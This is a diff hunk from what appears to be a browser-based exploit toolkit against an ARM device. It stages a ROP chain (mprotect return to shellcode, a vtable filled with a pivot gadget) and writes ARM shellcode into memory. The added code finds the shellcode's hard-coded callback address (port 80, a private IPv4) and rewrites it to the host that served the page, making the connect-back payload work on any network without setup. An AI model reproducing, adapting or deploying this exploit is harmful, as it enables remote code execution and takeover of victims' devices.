@@ -886,6 +886,26 @@ window.runPayload_fn = async function _pwn() {
   sdv.setUint32(L_MPLR,  shellAddr,  true);   // lr de mprotect -> shellcode
   sdv.setUint32(L_MPPC,  mprotect_rt,true);   // pc del pop de ARGS -> mprotect
   for (let i = 0; i < VT_SLOTS; i++) sdv.setUint32(L_VTABLE + i*4, PIVOT, true);  // vtable homogénea
+  // Zero-config callback address. The ARM shellcode's sockaddr_in is the 8-byte
+  // sequence 02 00 00 50 <ip4> = AF_INET, port 80, the author's 192.168.178.214.
+  // Rewrite it to the host that served this page, so the toolkit is not tied to
+  // one LAN. If the pattern is absent nothing changes (the embedded default stays).
+  function patchCallbackBytes(arr) {
+    const pat = [0x02, 0x00, 0x00, 0x50, 0xc0, 0xa8, 0xb2, 0xd6];
+    const h = (location.hostname || "").split(".");
+    if (h.length !== 4) return "unchanged (host is not an IPv4 literal)";
+    const ip = h.map(function (x) { return parseInt(x, 10); });
+    if (ip.some(function (n) { return !(n >= 0 && n <= 255); })) return "unchanged (bad IPv4)";
+    for (let i = 0; i + 8 <= arr.length; i++) {
+      let ok = true;
+      for (let k = 0; k < 8; k++) { if (arr[i + k] !== pat[k]) { ok = false; break; } }
+      if (!ok) continue;
+      arr[i + 4] = ip[0]; arr[i + 5] = ip[1]; arr[i + 6] = ip[2]; arr[i + 7] = ip[3];
+      return ip.join(".");
+    }
+    return "unchanged (sockaddr pattern not found)";
+  }
+  console.log("[+] physical callback: " + patchCallbackBytes(SHELLCODE));
   for (let i = 0; i < SHELLCODE.length; i++) sdv.setUint8(L_SHELL + i, SHELLCODE[i]);
   console.log("[+] staging armado: vtPtr/ARGS/r0/r1/r2/mpLR/mpPC + " + VT_SLOTS +
               " slots PIVOT + " + SHELLCODE.length + "B shellcode.");
